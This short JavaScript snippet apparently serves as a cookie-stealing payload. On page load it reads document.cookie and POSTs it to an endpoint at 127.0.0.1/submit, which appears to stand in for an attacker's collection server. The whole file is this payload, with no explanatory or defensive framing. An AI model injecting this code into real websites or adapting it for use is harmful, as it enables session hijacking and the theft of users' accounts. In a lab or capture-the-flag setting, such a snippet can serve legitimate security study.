document.addEventListener('DOMContentLoaded', () => {
  fetch("http://127.0.0.1/submit", {
    method: "POST",
    headers: {'Content-Type': 'application/json', 'Content-Length': '82'}, 
    body: JSON.stringify({"message": document.cookie})
  }).then(res => {
    console.log("Request complete! response:", res);
  });
})
